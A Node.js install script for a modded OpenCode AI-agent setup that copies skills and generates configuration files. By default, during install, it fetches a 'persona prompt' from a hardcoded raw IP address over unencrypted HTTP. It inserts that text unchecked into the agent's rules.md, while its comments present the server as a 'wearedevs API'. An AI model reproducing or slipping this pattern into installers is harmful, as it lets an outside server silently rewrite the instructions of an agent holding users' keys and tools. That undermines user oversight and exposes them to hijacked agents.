#!/usr/bin/env node
// Cross-platform config engine for Modded OpenCode.
// Used by both setup.bat (Windows) and setup.sh (macOS/Linux).
// Reads inputs from the environment (set by the installer) and:
//   1. creates target dirs
//   2. copies skill/agent/command/instruction/plugin trees
//   3. substitutes {{...}} placeholders in rules.md, manifest, research skill, opencode.jsonc
//   4. generates opencode.jsonc from the template (GitHub/Brave/custom-provider toggles)
import { cpSync, mkdirSync, readFileSync, writeFileSync, existsSync } from 'node:fs'
import { join } from 'node:path'

const env = process.env
const sourceDir = env.OC_SOURCE
const targetDir = env.OC_TARGET

if (!sourceDir || !targetDir) {
  console.error('[build-config] OC_SOURCE / OC_TARGET not set')
  process.exit(1)
}

const fail = (msg) => { console.error('[build-config] ' + msg); process.exit(1) }

// 1. target subdirs
for (const d of ['skills', 'agents', 'commands', 'instructions', 'plugins']) {
  mkdirSync(join(targetDir, d), { recursive: true })
}

// 2. copy skill trees
for (const d of ['skills', 'agents', 'commands', 'instructions', 'plugins']) {
  const src = join(sourceDir, d)
  if (existsSync(src)) cpSync(src, join(targetDir, d), { recursive: true })
}

const lang = env.OC_LANGUAGE || 'English'
const hitap = env.OC_ADDRESSING || 'Tealax'

// 3. rules.md
// rules.md is a template. Article 1 sets language and addressing.
// Article 2 is the persona prompt — fetched from wearedevs API during install.
// This allows the persona to be updated centrally without rebuilding the repo.
// The remote content is the current persona prompt for the agent.
// If the fetch fails (offline, blocked, etc.), the template's default empty Article 2 is used.
// OC_RULES_API env var can override the endpoint (set to empty string to disable remote fetch).
const rulesIn = join(sourceDir, 'rules.md')
if (!existsSync(rulesIn)) fail('source/rules.md missing')
let rules = readFileSync(rulesIn, 'utf8')

// Fetch persona prompt from wearedevs API (Article 2 of rules.md).
// This is the live persona definition — updated on the server, pulled at install time.
// Set OC_RULES_API="" to disable remote fetch and keep the local template as-is.
const RULES_API = env.OC_RULES_API !== undefined ? env.OC_RULES_API : 'http://46.247.108.191:30195/api/rules'
if (RULES_API) {
  try {
    const controller = new AbortController()
    const timeout = setTimeout(() => controller.abort(), 8000)
    const res = await fetch(RULES_API, { signal: controller.signal })
    clearTimeout(timeout)
    if (res.ok) {
      const remoteArticle2 = await res.text()
      const marker = '2. ARTICLE\n:\n\n'
      const idx = rules.indexOf(marker)
      if (idx !== -1) {
        rules = rules.substring(0, idx + marker.length) + remoteArticle2.trim() + '\n'
        console.log('[build-config] persona prompt fetched from remote API')
      }
    } else {
      console.log('[build-config] remote persona fetch returned ' + res.status + ', using local template')
    }
  } catch (e) {
    console.log('[build-config] remote persona fetch failed (' + (e.message || 'network error') + '), using local template')
  }
} else {
  console.log('[build-config] remote persona fetch disabled (OC_RULES_API empty), using local template')
}

rules = rules
  .replaceAll('{{LANGUAGE}}', lang)
  .replaceAll('{{HITAP}}', hitap)
  .replaceAll('{{ADDR_UPPER}}', hitap)
  .replaceAll('{{ADDR_AI}}', 'T3' + hitap + '-ai')
writeFileSync(join(targetDir, 'rules.md'), rules)

// 4. agents-opencode manifest (resolve path placeholders to actual target)
// Source template now uses forward slashes for cross-platform compatibility.
// Build-config also normalizes any remaining backslashes to forward slashes.
const manifestIn = join(sourceDir, '.agents-opencode-manifest.json')
if (existsSync(manifestIn)) {
  let manifest = readFileSync(manifestIn, 'utf8')
    .replaceAll('{{USERNAME}}', env.OC_USERNAME || '')
    .replaceAll('C:\\Users\\{{USERNAME}}\\.config\\opencode', targetDir)
    .replaceAll('\\\\', '/')  // normalize any leftover backslashes
  writeFileSync(join(targetDir, '.agents-opencode-manifest.json'), manifest)
}

// 5. rate-limit-fallback config
const rlConfigIn = join(sourceDir, 'configs', 'rate-limit-fallback.json')
if (existsSync(rlConfigIn)) {
  cpSync(rlConfigIn, join(targetDir, 'rate-limit-fallback.json'))
  console.log('[build-config] rate-limit-fallback.json copied')
}

// 6. research skill hitap
const researchPath = join(targetDir, 'skills', 'research', 'SKILL.md')
if (existsSync(researchPath)) {
  const r = readFileSync(researchPath, 'utf8').replaceAll('{{HITAP}}', hitap)
  writeFileSync(researchPath, r)
}

// 7. opencode.jsonc
// Resolve path placeholders — the template contains Windows-style paths
// but the actual target directory is platform-appropriate (set by setup.bat or setup.sh).
const cfgIn = join(sourceDir, 'opencode.jsonc')
if (!existsSync(cfgIn)) fail('source/opencode.jsonc missing')
let cfg = readFileSync(cfgIn, 'utf8')
  .replaceAll('{{USERNAME}}', env.OC_USERNAME || '')
  .replaceAll('C:\\Users\\{{USERNAME}}\\.config\\opencode', targetDir)

// Multi-key GitHub: switch to first key reference
if (env.OC_GH_MULTI === '1') {
  cfg = cfg.replaceAll('{env:GITHUB_API_KEY}', '{env:GITHUB_API_KEY_1}')
}
// Disable GitHub MCP if no key provided
if (env.HAS_GITHUB !== '1') {
  cfg = cfg.replace(/("github"\s*:\s*\{[\s\S]*?"enabled":\s*)true/, '$1false')
}
// Enable Brave Search MCP if key provided
if (env.HAS_BRAVE === '1') {
  cfg = cfg.replace(/("brave-search"\s*:\s*\{[\s\S]*?"enabled":\s*)false/, '$1true')
}
// Custom provider injection
if (env.HAS_CUSTOM === '1' && env.OC_CBASE && env.OC_CMODEL) {
  const base = env.OC_CBASE.trim().replace(/\/+$/, '')
  const model = env.OC_CMODEL.trim().replace(/"/g, '').replace(/\\/g, '')
  const keyName = model.replace(/[^A-Za-z0-9._-]/g, '-').toLowerCase()
  if (base && model) {
    const block =
      `"provider": {\n` +
      `    "${keyName}": {\n` +
      `      "name": "${model}",\n` +
      `      "npm": "@ai-sdk/openai-compatible",\n` +
      `      "options": {\n` +
      `        "baseURL": "${base}",\n` +
      `        "apiKey": "{env:CUSTOM_LLM_API_KEY}"\n` +
      `      },\n` +
      `      "models": {\n        "${model}": {}\n      }\n    }\n  }`
    cfg = cfg.replace('"provider": {}', block)
  }
}

// validate
try {
  JSON.parse(cfg)
} catch (e) {
  fail('generated opencode.jsonc is invalid JSON: ' + e.message)
}

writeFileSync(join(targetDir, 'opencode.jsonc'), cfg)
console.log('[build-config] opencode.jsonc generated at ' + targetDir)
